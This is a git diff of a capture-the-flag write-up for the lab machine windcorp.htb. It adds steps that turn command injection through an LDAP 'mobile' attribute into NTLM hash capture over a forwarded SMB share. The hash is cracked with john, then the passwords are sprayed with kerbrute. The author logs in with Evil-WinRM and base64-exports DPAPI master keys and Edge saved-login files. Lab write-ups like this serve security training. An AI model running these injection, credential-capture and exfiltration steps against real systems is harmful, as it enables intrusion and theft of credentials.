@@ -903,7 +903,7 @@ We can change our `mobile` property using [LDIF Files](https://www.digitalocean.
 dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
 changetype: modify
 replace: mobile
-mobile: 1; ping 10.10.14.8
+mobile: 1; $(ping 10.10.14.8)
 ```
 
 ```bash
@@ -911,7 +911,7 @@ root@webserver:~# cat rduncun.ldif
 dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
 changetype: modify
 replace: mobile
-mobile: 1; ping 10.10.14.8
+mobile: 1; $(ping 10.10.14.8)
 ```
 
 ```bash
@@ -925,7 +925,7 @@ modifying entry "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb"
 
 ```bash
 root@webserver:~# ldapsearch -Q -H ldap://windcorp.htb -b "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" mobile | grep mobile:
-mobile: 1; ping 10.10.14.8
+mobile: 1; $(ping 10.10.14.8)
 ```
 
 After a couple of minutes we see the host trying to reach our via icmp.
@@ -945,6 +945,418 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 
 It means we have remote code execution here.
+
+If we keep it there, we are going to keep receiving the icmp pings.
+
+```bash
+$ sudo tcpdump -n -i tun0 icmp                  
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+03:29:04.687234 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 1, length 40
+03:29:04.687295 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 1, length 40
+03:29:05.701016 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 2, length 40
+03:29:05.701046 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 2, length 40
+03:29:06.710215 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 3, length 40
+03:29:06.710258 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 3, length 40
+03:29:07.719517 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 4, length 40
+03:29:07.719554 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 4, length 40
+03:31:03.095822 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 5, length 40
+03:31:03.095889 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 5, length 40
+03:31:04.112077 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 6, length 40
+03:31:04.112122 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 6, length 40
+03:31:05.128385 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 7, length 40
+03:31:05.128436 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 7, length 40
+03:31:06.136627 IP 10.10.11.179 > 10.10.14.8: ICMP echo request, id 1, seq 8, length 40
+03:31:06.136668 IP 10.10.14.8 > 10.10.11.179: ICMP echo reply, id 1, seq 8, length 40
+```
+
+Lets try to get a NTLM hash using `Get-Content` from a network share as a payload.
+
+```bash
+root@webserver:~# cat rduncun.ldif 
+dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: 1; $(gci \\webserver.windcorp.htb\share)
+```
+
+```bash
+root@webserver:~# ldapmodify -Y GSSAPI -H ldap://windcorp.htb -D "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" -f rduncun.ldif 
+SASL/GSSAPI authentication started
+SASL username: ray.duncan@WINDCORP.HTB
+SASL SSF: 256
+SASL data security layer installed.
+modifying entry "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb"
+```
+
+```bash
+root@webserver:~# ldapsearch -Q -H ldap://windcorp.htb -b "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" mobile | grep mobile:
+mobile: 1; $(gci \\webserver.windcorp.htb\share)
+```
+
+Lets use `chisel` here again to redirect the traffic coming on `port 445` to the `webserver` to our Kali on `port 445`.
+
+```bash
+root@webserver:~# ./chisel client 10.10.14.8:8000 192.168.0.100:445:10.10.14.8:445
+2024/08/26 20:18:58 client: Connecting to ws://10.10.14.8:8000
+2024/08/26 20:18:58 client: tun: proxy#192.168.0.100:445=>10.10.14.8:445: Listening
+2024/08/26 20:18:59 client: Connected (Latency 89.3492ms)
+```
+
+We see the `webserver` is now listening into the port 445.
+
+```bash
+root@webserver:~# ss -lntp | grep :445
+LISTEN 0      4096   192.168.0.100:445       0.0.0.0:*    users:(("chisel",pid=1830,fd=3))
+```
+
+And we start a SMB server on Kali.
+
+```bash
+$ impacket-smbserver share $(pwd) -smb2support
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.14.8,34326)
+[*] Closing down connection (10.10.14.8,34326)
+[*] Remaining connections []
+[*] Incoming connection (10.10.14.8,42610)
+[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
+[*] AUTHENTICATE_MESSAGE (WINDCORP\scriptrunner,HOPE)
+[*] User HOPE\scriptrunner authenticated successfully
+[*] scriptrunner::WINDCORP:aaaaaaaaaaaaaaaa:0699004175651f6bdf2ed0f1fee373aa:010100000000000080c59f50aaf7da0164d60e3f2aeadcfd00000000010010004d004900570048007100510048006200030010004d0049005700480071005100480062000200100046004d006b00760072006c0075007a000400100046004d006b00760072006c0075007a000700080080c59f50aaf7da01060004000200000008003000300000000000000000000000002100006d26f6f0c166f0dc6af1c9e49aafa69cf7dafdadef64709afd741d94411225010a001000000000000000000000000000000000000900360063006900660073002f007700650062007300650072007600650072002e00770069006e00640063006f00720070002e006800740062000000000000000000
+[*] Closing down connection (10.10.14.8,42610)
+[*] Remaining connections []
+```
+
+```bash
+$ cat scriptrunner.hash                                                              
+scriptrunner::WINDCORP:aaaaaaaaaaaaaaaa:0699004175651f6bdf2ed0f1fee373aa:010100000000000080c59f50aaf7da0164d60e3f2aeadcfd00000000010010004d004900570048007100510048006200030010004d0049005700480071005100480062000200100046004d006b00760072006c0075007a000400100046004d006b00760072006c0075007a000700080080c59f50aaf7da01060004000200000008003000300000000000000000000000002100006d26f6f0c166f0dc6af1c9e49aafa69cf7dafdadef64709afd741d94411225010a001000000000000000000000000000000000000900360063006900660073002f007700650062007300650072007600650072002e00770069006e00640063006f00720070002e006800740062000000000000000000
+```
+
+```bash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt scriptrunner.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!@p%i&J#iNNo1T2  (scriptrunner)     
+1g 0:00:00:07 DONE (2024-08-26 04:29) 0.1371g/s 1967Kp/s 1967Kc/s 1967KC/s !SkicA!..*7¡Vamos!
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+Now we have 2 passwords. We can try to see if these work for other accounts while we enumerate more.
+
+| Username | Password | Target |
+| -- | -- | -- |
+| ray.duncan | pantera | Domain |
+| scriptrunner | !@p%i&J#iNNo1T2 | Domain |
+
+```bash
+root@webserver:~# cat pwds.txt 
+pantera
+!@p%i&J#iNNo1T2
+```
+
+Lets get a list of users.
+
+We could use `netexec` with the following command
+
+```bash
+$ proxychains netexec smb hope.windcorp.htb -k -u 'ray.duncan' -p 'pantera' --users
+```
+
+Or try to get it direct from ldap with this other one.
+
+```bash
+root@webserver:~# ldapsearch -Q -H ldap://windcorp.htb -b "DC=windcorp,DC=htb" sAMAccountName | grep sAMAccountName: | grep -v '\$$' | sort -u | awk '{print $2}' > users.txt
+```
+
+Now lets use [kerbrute](https://github.com/ropnop/kerbrute) to help us.
+
+```bash
+$ scp -i ~/.ssh/kali-rsa /opt/kerbrute_linux_amd64 root@$TARGET:~/ 
+Enter passphrase for key '/home/kali/.ssh/kali-rsa': 
+kerbrute_linux_amd64                                           100% 8092KB 754.6KB/s   00:10
+```
+
+```bash
+root@webserver:~# ./kerbrute_linux_amd64 passwordspray -d windcorp.htb ./users.txt 'pantera'
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 08/26/24 - Ronnie Flathers @ropnop
+
+2024/08/26 20:53:38 >  Using KDC(s):
+2024/08/26 20:53:38 >   hope.windcorp.htb:88
+
+2024/08/26 20:53:40 >  [+] VALID LOGIN:  Ray.Duncan@windcorp.htb:pantera
+2024/08/26 20:53:40 >  Done! Tested 317 logins (1 successes) in 2.918 seconds
+```
+
+```bash
+root@webserver:~# ./kerbrute_linux_amd64 passwordspray -d windcorp.htb ./users.txt '!@p%i&J#iNNo1T2'
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 08/26/24 - Ronnie Flathers @ropnop
+
+2024/08/26 20:54:27 >  Using KDC(s):
+2024/08/26 20:54:27 >   hope.windcorp.htb:88
+
+2024/08/26 20:54:28 >  [+] VALID LOGIN:  Bob.Wood@windcorp.htb:!@p%i&J#iNNo1T2
+2024/08/26 20:54:30 >  [+] VALID LOGIN:  scriptrunner@windcorp.htb:!@p%i&J#iNNo1T2
+2024/08/26 20:54:30 >  Done! Tested 317 logins (2 successes) in 2.590 seconds
+```
+
+| Username | Password | Target |
+| -- | -- | -- |
+| ray.duncan | pantera | Domain |
+| scriptrunner | !@p%i&J#iNNo1T2 | Domain |
+| bob.wood | !@p%i&J#iNNo1T2 | Domain |
+
+There are 2 `bob.wood` on the domain. One that seems to be an admin.
+
+```bash
+root@webserver:~# cat users.txt | grep -i bob.wood
+Bob.Wood
+bob.woodadm
+```
+
+To get auth on my server, I need to set up Kerberos to get a ticket through the proxy. I’ll edit my `/etc/krb5.conf` file to be:
+
+```bash
+$ cat /etc/krb5.conf                                                                 
+[libdefaults]
+        default_realm = WINDCORP.HTB
+
+# The following krb5.conf variables are only for MIT Kerberos.
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        rdns = false
+
+
+# The following libdefaults parameters are only for Heimdal Kerberos.
+        fcc-mit-ticketflags = true
+
+[realms]
+        WINDCORP.HTB = {
+                kdc = hope.windcorp.htb
+                admin_server = hope.windcorp.com
+                default_domain = windcorp.htb
+        }
+
+[domain_realm]
+        .windcorp.htb = WINDCORP.HTB
+        windcorp.com = WINDCORP.HTB
+
+[appdefaults]
+        forwardable = true
+                pam = {
+                        WINDCORP.HTB = {
+                                ignore_k5login = false
+                                }
+                }
+```
+
+```bash
+$ proxychains kinit bob.wood          
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Password for bob.wood@WINDCORP.HTB: !@p%i&J#iNNo1T2
+```
+
+```bash$ proxychains klist
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: bob.wood@WINDCORP.HTB
+
+Valid starting       Expires              Service principal
+08/26/2024 12:14:58  08/26/2024 16:14:58  krbtgt/WINDCORP.HTB@WINDCORP.HTB
+        renew until 08/26/2024 16:14:58
+```
+
+```bash
+$ proxychains evil-winrm -i hope.windcorp.htb -u 'bob.wood' -r windcorp.htb
+...                            
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Bob.Wood\Documents> whoami
+windcorp\bob.wood
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> pwd
+
+Path
+----
+C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> dir -force
+
+
+    Directory: C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         8/22/2022   2:17 PM            740 3ebf1d50-8f5c-4a75-9203-20347331bad8
+-a-hs-          5/4/2022   4:49 PM            740 a8bd1009-f2ac-43ca-9266-8e029f503e11
+-a-hs-          5/4/2022   4:49 PM            908 BK-WINDCORP
+-a-hs-         8/22/2022   2:17 PM             24 Preferred
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> certutil -encode 3ebf1d50-8f5c-4a75-9203-20347331bad8 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64
+Input Length = 740
+Output Length = 1076
+CertUtil: -encode command completed successfully.
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> cat 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64
+-----BEGIN CERTIFICATE-----
+AgAAAAAAAAAAAAAAMwBlAGIAZgAxAGQANQAwAC0AOABmADUAYwAtADQAYQA3ADUA
+LQA5ADIAMAAzAC0AMgAwADMANAA3ADMAMwAxAGIAYQBkADgAAAAAAAAAAAAAAAAA
+iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAcyYbY+uNOC15HXPD
+rWt4xFBGAAAJgAAAA2YAAIQpKENqwdH3+Q42xgY+vzf/Zoqh48Ai1asuixEAvao4
+CjrEwkM228V54U20VyD2x+HYMCtiOkLv+MaAZtUYYDgRR1mdBddZvUkFJdm6ah1w
+cC9BV957PaFOIBgecwElAh/HAkibCcd7AgAAAP81lRbwNrSOPETKqwWxP5xQRgAA
+CYAAAANmAAD4b8/yEvguD8iuTHPDs2WjtvO0i2QSyw6M/oOomYZ7PHXpp2+MznTM
+nTmVxqc2WUywi+zxPwb3jVuQJKquC8FhN/2fsDbMmWYCAAAAAAEAAFgAAADKa/6+
+IfJmSqO4oAhXklb6wrZqDn/UbHkF1zXvPLHhHxTNqItR8Boy9Rm89UWZAUgauudM
+EKURQuLsnXMuX3iE/FfC9/fwoBWM00p4StNEY5Ljb8p5MRWRASaNe9AelTZoyZGM
+bmeCbFniv+yhpIBEebiBvT99s4mvx8A41hTeaAjGfXLcdBscBjdXCXlcJisS07or
+JqGQ5L1dKaZqEi8Aw3FLusX08e6rrlLHIy0/itJxRWOYUSD0RigMUf7m1UzjY/Jv
+/YyiS4vvZjburkB2BhEb8/B+G2S10vfBGGXPF/MGGUAz541YWzYm4I94WJF88eSw
+9+WLs0LLcPj8Eu7U6I2J3vkDBPb11nFwVqpQHg0XH9qVX1aOqumiAoGLtXbaLlLi
+oOsG2+cx/9iXUG3pNb+JkFQ4/nITLKnQJXTHDPVISFaHholhgYTeZFzTnHAn/j4O
+X3Eaz97HcWp59ovlfki0XmOMtGs=
+-----END CERTIFICATE-----
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> certutil -encode a8bd1009-f2ac-43ca-9266-8e029f503e11 a8bd1009-f2ac-43ca-9266-8e029f503e11.b64
+Input Length = 740
+Output Length = 1076
+CertUtil: -encode command completed successfully.
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761> cat a8bd1009-f2ac-43ca-9266-8e029f503e11.b64
+-----BEGIN CERTIFICATE-----
+AgAAAAAAAAAAAAAAYQA4AGIAZAAxADAAMAA5AC0AZgAyAGEAYwAtADQAMwBjAGEA
+LQA5ADIANgA2AC0AOABlADAAMgA5AGYANQAwADMAZQAxADEAAAAAAAAAAAAAAAAA
+iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAuR6TrvjSY10cgOXc
+3fH7sFBGAAAJgAAAA2YAANem3q9mPiPPHJWQskoFUjXgcbC1a2OvhQEvMZ/NfIz7
+ITxvW6gXLykNnvZ1OgxkZ9oInH4GCUBg0thC4s5pfvwQmYWi82V0+Xzs4RJAijax
+fRQw8/2PswPtY7z2JlVinYPMQnCFAZRfAgAAACm91rg5CTspaKCdO0VcEWlQRgAA
+CYAAAANmAAAUAhae29/F3FmiRuhMIplSMuK0tKTxrI7kDSODLiaTfZiR+oVVTMay
+fdiIEO3n842SpsHgohYYNij1u7sVitpm7XSzJrSekisCAAAAAAEAAFgAAADKa/6+
+IfJmSqO4oAhXklb6Ra4KfBBwfypYTMvsKvdydZfn5JMN0WdQ0s58XVPFs1hGm7f+
+kXkScTZCT+OLnxS747z80g3N4xuVwJ9EPy15q18vxycqNN5lXBPEjZcGpq6Wbj8U
+yEIo2Jgwd+YGUtCLJuoL9D0YN46Ra1LVUgLNHWu1jybaikg5GN0yaTE3r0B0L2g/
+beZ2yKJARPUshSuGlCf2HRsi6tO2yqBZBjMjFTZJQPt4hrKJm9bn5Qd5kZSggjy5
+HVtLRvZZXjhMU+cXlfRuCD/AE54BnszNK78e7LZF7J3pRT9RbdbrgctaR8EXF2gM
+Lfcxq7UBteEZCQAtS7mfZjvwI0i15/4rq8bYRxtwgc4PHUWN+jWNqjWLubp5NiV8
+4TpmPxZFTXNgcAL1Yueop4Y1qcl/l+CeAGfwc3viVD2hESIAK6Zm3OFAByjsyxUh
+29h5Ie/21Ms2D8kNzPms0rzLbXA=
+-----END CERTIFICATE-----
+```
+
+```bash
+$ cat 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64    
+AgAAAAAAAAAAAAAAMwBlAGIAZgAxAGQANQAwAC0AOABmADUAYwAtADQAYQA3ADUA
+LQA5ADIAMAAzAC0AMgAwADMANAA3ADMAMwAxAGIAYQBkADgAAAAAAAAAAAAAAAAA
+iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAcyYbY+uNOC15HXPD
+rWt4xFBGAAAJgAAAA2YAAIQpKENqwdH3+Q42xgY+vzf/Zoqh48Ai1asuixEAvao4
+CjrEwkM228V54U20VyD2x+HYMCtiOkLv+MaAZtUYYDgRR1mdBddZvUkFJdm6ah1w
+cC9BV957PaFOIBgecwElAh/HAkibCcd7AgAAAP81lRbwNrSOPETKqwWxP5xQRgAA
+CYAAAANmAAD4b8/yEvguD8iuTHPDs2WjtvO0i2QSyw6M/oOomYZ7PHXpp2+MznTM
+nTmVxqc2WUywi+zxPwb3jVuQJKquC8FhN/2fsDbMmWYCAAAAAAEAAFgAAADKa/6+
+IfJmSqO4oAhXklb6wrZqDn/UbHkF1zXvPLHhHxTNqItR8Boy9Rm89UWZAUgauudM
+EKURQuLsnXMuX3iE/FfC9/fwoBWM00p4StNEY5Ljb8p5MRWRASaNe9AelTZoyZGM
+bmeCbFniv+yhpIBEebiBvT99s4mvx8A41hTeaAjGfXLcdBscBjdXCXlcJisS07or
+JqGQ5L1dKaZqEi8Aw3FLusX08e6rrlLHIy0/itJxRWOYUSD0RigMUf7m1UzjY/Jv
+/YyiS4vvZjburkB2BhEb8/B+G2S10vfBGGXPF/MGGUAz541YWzYm4I94WJF88eSw
+9+WLs0LLcPj8Eu7U6I2J3vkDBPb11nFwVqpQHg0XH9qVX1aOqumiAoGLtXbaLlLi
+oOsG2+cx/9iXUG3pNb+JkFQ4/nITLKnQJXTHDPVISFaHholhgYTeZFzTnHAn/j4O
+X3Eaz97HcWp59ovlfki0XmOMtGs=
+
+$ base64 -d 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64 > 3ebf1d50-8f5c-4a75-9203-20347331bad8
+```
+
+```bash
+$ cat a8bd1009-f2ac-43ca-9266-8e029f503e11.b64    
+AgAAAAAAAAAAAAAAYQA4AGIAZAAxADAAMAA5AC0AZgAyAGEAYwAtADQAMwBjAGEA
+LQA5ADIANgA2AC0AOABlADAAMgA5AGYANQAwADMAZQAxADEAAAAAAAAAAAAAAAAA
+iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAuR6TrvjSY10cgOXc
+3fH7sFBGAAAJgAAAA2YAANem3q9mPiPPHJWQskoFUjXgcbC1a2OvhQEvMZ/NfIz7
+ITxvW6gXLykNnvZ1OgxkZ9oInH4GCUBg0thC4s5pfvwQmYWi82V0+Xzs4RJAijax
+fRQw8/2PswPtY7z2JlVinYPMQnCFAZRfAgAAACm91rg5CTspaKCdO0VcEWlQRgAA
+CYAAAANmAAAUAhae29/F3FmiRuhMIplSMuK0tKTxrI7kDSODLiaTfZiR+oVVTMay
+fdiIEO3n842SpsHgohYYNij1u7sVitpm7XSzJrSekisCAAAAAAEAAFgAAADKa/6+
+IfJmSqO4oAhXklb6Ra4KfBBwfypYTMvsKvdydZfn5JMN0WdQ0s58XVPFs1hGm7f+
+kXkScTZCT+OLnxS747z80g3N4xuVwJ9EPy15q18vxycqNN5lXBPEjZcGpq6Wbj8U
+yEIo2Jgwd+YGUtCLJuoL9D0YN46Ra1LVUgLNHWu1jybaikg5GN0yaTE3r0B0L2g/
+beZ2yKJARPUshSuGlCf2HRsi6tO2yqBZBjMjFTZJQPt4hrKJm9bn5Qd5kZSggjy5
+HVtLRvZZXjhMU+cXlfRuCD/AE54BnszNK78e7LZF7J3pRT9RbdbrgctaR8EXF2gM
+Lfcxq7UBteEZCQAtS7mfZjvwI0i15/4rq8bYRxtwgc4PHUWN+jWNqjWLubp5NiV8
+4TpmPxZFTXNgcAL1Yueop4Y1qcl/l+CeAGfwc3viVD2hESIAK6Zm3OFAByjsyxUh
+29h5Ie/21Ms2D8kNzPms0rzLbXA=                                                                                                                                
+$ base64 -d a8bd1009-f2ac-43ca-9266-8e029f503e11.b64 > a8bd1009-f2ac-43ca-9266-8e029f503e11
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default> pwd
+Path
+----
+C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default> dir -force Login*
+    Directory: C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          5/4/2022   7:46 PM          55296 Login Data
+-a----          5/4/2022   7:46 PM              0 Login Data-journal
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default> certutil -encode 'Login Data' Login_Data.b64
+Input Length = 55296
+Output Length = 76088
+CertUtil: -encode command completed successfully.
+```
+
+```bash
+```
+
+```bash
+```
 
 ```bash
 ```
